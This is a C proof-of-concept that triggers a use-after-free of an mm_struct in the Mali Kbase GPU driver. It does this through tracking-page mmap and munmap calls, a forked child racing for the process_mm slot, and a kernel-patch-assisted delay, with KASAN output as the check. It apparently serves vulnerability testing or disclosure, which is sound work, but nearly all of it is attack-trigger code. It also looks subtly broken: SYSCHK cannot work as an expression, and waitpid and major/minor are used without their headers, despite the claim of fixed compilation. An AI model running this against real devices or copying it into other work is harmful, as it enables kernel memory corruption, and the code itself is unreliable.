// SPDX-License-Identifier: MIT
/*
 * Simplified test script for Mali Kbase mm_struct UAF PoC
 * Provides comprehensive debug output including mapped regions, fd info,
 * and detailed step-by-step explanations.
 *
 * This is a simplified version that fixes compilation issues while maintaining
 * the detailed debug output functionality.
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <stdint.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <time.h>
#include <signal.h>

// Simple error checking macro
#define SYSCHK(x) { \
  typeof(x) __res = (x); \
  if (__res == (typeof(x))-1) { \
    fprintf(stderr, "[FATAL] System call failed: %s\n", strerror(errno)); \
    fprintf(stderr, "       File: %s, Line: %d\n", __FILE__, __LINE__); \
    exit(1); \
  } \
  __res; \
}

#define DEBUG_LOG(msg, ...) \
  do { \
    time_t now = time(NULL); \
    struct tm *t = localtime(&now); \
    char timestamp[20]; \
    strftime(timestamp, sizeof(timestamp), "%H:%M:%S", t); \
    printf("[%s %s] %s\n", timestamp, (getpid() == parent_pid ? "PARENT" : "CHILD"), \
           msg, ##__VA_ARGS__); \
  } while(0)

// Define IOCTL constants
#define KBASE_IOCTL_TYPE 0x80
#define __u8  uint8_t
#define __u16 uint16_t
#define __u32 uint32_t
#define __u64 uint64_t

struct kbase_ioctl_version_check {
    __u16 major;
    __u16 minor;
};
#define KBASE_IOCTL_VERSION_CHECK _IOWR(KBASE_IOCTL_TYPE, 0, struct kbase_ioctl_version_check)

struct kbase_ioctl_set_flags {
    __u32 create_flags;
};
#define KBASE_IOCTL_SET_FLAGS _IOW(KBASE_IOCTL_TYPE, 1, struct kbase_ioctl_set_flags)

#define LOCAL_PAGE_SHIFT 12
#define BASE_MEM_MAP_TRACKING_HANDLE (3ul << LOCAL_PAGE_SHIFT)

int main(void) {
    int debug_enabled = 1;
    pid_t parent_pid = getpid();
    
    printf("=== Mali Kbase mm_struct UAF Test PoC ===\n");
    printf("PID: %d, PPID: %d\n", getpid(), getppid());
    printf("=== Debug Information ===\n");
    
    // Step 0: Environment setup
    DEBUG_LOG("Opening /dev/mali0 device file");
    printf("\n[STEP 0] Device Initialization\n");
    printf("  - Opening /dev/mali0 device file for read-write access\n");
    
    int mali_fd = SYSCHK(open("/dev/mali0", O_RDWR));
    printf("  -> SUCCESS: Device file descriptor: %d\n", mali_fd);
    
    // Display file descriptor details
    struct stat fd_stat;
    if (fstat(mali_fd, &fd_stat) == 0) {
        printf("  -> File type: %s\n", (S_ISCHR(fd_stat.st_mode) ? "character device" : "other"));
        printf("  -> Device number: %d:%d\n", major(fd_stat.st_rdev), minor(fd_stat.st_rdev));
    }
    
    // Step 1: Version check ioctl
    DEBUG_LOG("Executing KBASE_IOCTL_VERSION_CHECK");
    printf("\n[STEP 1] Version Check Ioctl\n");
    printf("  - Command: KBASE_IOCTL_VERSION_CHECK (_IOWR(0x80, 0, ...))\n");
    printf("  - Purpose: Verify Mali Kbase driver version compatibility\n");
    
    struct kbase_ioctl_version_check vc = {.major = 11, .minor = 11};
    printf("  - Input structure: major=%d, minor=%d\n", vc.major, vc.minor);
    
    int version_ret = ioctl(mali_fd, KBASE_IOCTL_VERSION_CHECK, &vc);
    if (version_ret < 0) {
        printf("  -> FAILURE: Version check failed: %s\n", strerror(errno));
    } else {
        printf("  -> SUCCESS: Ioctl returned %d, version struct updated: major=%d, minor=%d\n", 
               version_ret, vc.major, vc.minor);
    }
    
    // Step 2: Set flags ioctl
    DEBUG_LOG("Executing KBASE_IOCTL_SET_FLAGS");
    printf("\n[STEP 2] Set Flags Ioctl\n");
    printf("  - Command: KBASE_IOCTL_SET_FLAGS (_IOW(0x80, 1, ...))\n");
    printf("  - Purpose: Configure initial driver flags/context\n");
    
    struct kbase_ioctl_set_flags set_flags = {.create_flags = 0};
    printf("  - Input structure: create_flags=%d\n", set_flags.create_flags);
    
    int flags_ret = ioctl(mali_fd, KBASE_IOCTL_SET_FLAGS, &set_flags);
    if (flags_ret < 0) {
        printf("  -> FAILURE: Set flags failed: %s\n", strerror(errno));
    } else {
        printf("  -> SUCCESS: Ioctl returned %d\n", flags_ret);
    }
    
    // Step 3: Create parent tracking page (2 pages)
    DEBUG_LOG("Mapping parent tracking page");
    printf("\n[STEP 3] Parent Tracking Page Mapping\n");
    printf("  - Command: mmap(NULL, 0x2000, PROT_NONE, MAP_SHARED, mali_fd, BASE_MEM_MAP_TRACKING_HANDLE)\n");
    printf("  - Purpose: Create 2-page tracking VMA\n");
    
    void *parent_tracking_page = SYSCHK(mmap(NULL, 0x2000, PROT_NONE, MAP_SHARED,
                                             mali_fd, BASE_MEM_MAP_TRACKING_HANDLE));
    printf("  -> SUCCESS: Parent tracking page mapped at address: %p\n", parent_tracking_page);
    
    void *parent_page1 = parent_tracking_page;
    void *parent_page2 = (char *)parent_tracking_page + 0x1000;
    printf("  -> Page 1 address: %p\n", parent_page1);
    printf("  -> Page 2 address: %p\n", parent_page2);
    
    // Step 4: Unmap parent page 2
    DEBUG_LOG("Unmapping parent page 2 - triggers split and close handler");
    printf("\n[STEP 4] Parent Page 2 Unmapping\n");
    printf("  - Command: munmap(parent_tracking_page + 0x1000, 0x1000)\n");
    
    SYSCHK(munmap(parent_page2, 0x1000));
    printf("  -> SUCCESS: Parent page 2 unmapped\n");
    
    // Step 5: Fork child process
    DEBUG_LOG("Forking child process");
    printf("\n[STEP 5] Process Fork\n");
    printf("  - Purpose: Create child process to compete for kctx->process_mm slot\n");
    
    if (signal(SIGCHLD, SIG_IGN) == SIG_ERR) {
        printf("  -> WARNING: SIGCHLD handler setup failed\n");
    }
    
    pid_t child_pid = SYSCHK(fork());
    printf("  -> SUCCESS: Fork completed, child PID: %d\n", child_pid);
    
    if (child_pid == 0) {
        // Child process
        DEBUG_LOG("Child process: Setting name to CHILD");
        printf("\n[STEP 5a] Child Process Execution\n");
        printf("  - Child PID: %d\n", getpid());
        
        prctl(PR_SET_NAME, "CHILD", 0, 0, 0);
        printf("  - Setting child name to 'CHILD'\n");
        
        // Child creates its own tracking page
        DEBUG_LOG("Child mapping tracking page");
        printf("\n[STEP 5b] Child Tracking Page Mapping\n");
        
        void *child_tracking_page = SYSCHK(mmap(NULL, 0x1000, PROT_NONE, MAP_SHARED,
                                               mali_fd, BASE_MEM_MAP_TRACKING_HANDLE));
        printf("  -> SUCCESS: Child tracking page mapped at address: %p\n", child_tracking_page);
        
        // Sleep to control race timing
        DEBUG_LOG("Child sleeping for 2 seconds");
        printf("\n[STEP 5c] Controlled Delay\n");
        printf("  - Command: sleep(2)\n");
        
        sleep(2);
        
        // Child unmaps
        DEBUG_LOG("Child unmapping tracking page");
        printf("\n[STEP 5d] Child Page Unmapping\n");
        
        SYSCHK(munmap(child_tracking_page, 0x1000));
        printf("  -> SUCCESS: Child page unmapped\n");
        
        // Child exits
        DEBUG_LOG("Child exiting - mm_struct will be freed");
        printf("\n[STEP 5e] Child Process Exit\n");
        printf("  -> Command: exit(0)\n");
        printf("  -> Effect: Child's mm_struct freed by kernel\n");
        
        exit(0);
    } else {
        // Parent process
        DEBUG_LOG("Parent process: Sleeping 1 second then setting name to SLOWME");
        printf("\n[STEP 6a] Parent Process Continuation\n");
        
        sleep(1);
        
        prctl(PR_SET_NAME, "SLOWME", 0, 0, 0);
        printf("\n[STEP 6b] Race Window Activation\n");
        printf("  - Setting parent name to 'SLOWME' (enables kernel patch delay)\n");
        
        // Parent unmaps
        DEBUG_LOG("Parent unmapping page 1 - triggers close handler");
        printf("\n[STEP 6c] Parent Page 1 Unmapping\n");
        printf("  - Command: munmap(parent_tracking_page, 0x1000) [KERNEL-PATCH-ASSISTED DELAY]\n");
        
        SYSCHK(munmap(parent_page1, 0x1000));
        printf("  -> SUCCESS: Parent page 1 unmapped\n");
        
        prctl(PR_SET_NAME, "PARENT", 0, 0, 0);
        printf("\n[STEP 7] Race Condition Execution\n");
        printf("  -> The UAF will occur when parent writes to child's freed mm_struct!\n");
        printf("  -> Check kernel logs (dmesg) for KASAN use-after-free reports\n");
        
        // Wait a bit to allow the kernel to process the race
        sleep(3);
        printf("\n[TEST COMPLETE]\n");
        printf("  - If this was run with KASAN, you should see a KASAN: use-after-free BUG in kernel logs.\n");
        printf("  - Look for: 'BUG: KASAN: use-after-free in kbasep_add_mm_counter'\n");
        
        // Wait for child
        waitpid(child_pid, NULL, 0);
        
        printf("  -> Child process completed\n");
        
        return 0;
    }
}